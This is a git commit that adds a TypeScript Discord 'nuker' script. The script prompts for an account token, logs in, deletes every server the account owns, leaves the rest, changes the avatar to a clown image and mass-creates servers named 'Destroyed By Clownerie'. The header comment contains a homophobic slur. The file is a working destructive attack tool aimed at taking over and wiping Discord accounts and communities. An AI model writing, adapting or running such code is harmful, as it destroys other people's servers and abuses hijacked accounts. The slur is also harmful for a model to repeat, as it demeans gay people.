f699d23f48dfea463d34e6dee709a394608ec8ca
Blacklight42 <fyfyledc@gmail.com>
2020-11-10 16:07:08 +0100

    ts-node directement installe

---
+++ index.ts
@@ -0,0 +1,46 @@
+//Dev By Blacklight
+//Don't skid, faggot
+import * as Discord from "discord.js"
+import * as readline from 'readline'
+
+let rl = readline.createInterface({
+    input: process.stdin,
+  output: process.stdout
+})
+
+let client = new Discord.Client()
+
+rl.question('Entrez le token : ', (token) => {
+
+    client.login(token)
+
+})
+
+client.once('ready', () => {
+
+    console.clear
+    console.info('Connecté')
+
+    function cGuilds(){
+
+        var nguild = ["Destroyed BY CWN", "Destroyed By Clownerie", "DestROYed bY cloWNerie", "DeStRoYeD bY cLoWnEriE", "NIQUED BY CLOWNERIE"]
+        var nguilds = nguild[Math.floor(Math.random()*nguild.length)]
+
+        for(var i = 100; i >= 0; i--) {
+            client.user.createGuild(nguilds, 'europe', null)
+    }
+    }
+    
+    function lGuilds(){
+    
+        client.guilds.map((g) => { g.leave().catch(console.error)})
+    
+    }
+    
+    console.info('Destroying...')
+    client.guilds.map((g) => { g.delete().catch(console.error)})
+    client.user.setAvatar('https://cdn.discordapp.com/attachments/733972937425813516/775078883531030548/clown.png')
+    
+    setTimeout(lGuilds, 1000)
+    setTimeout(cGuilds, 5000)
+})
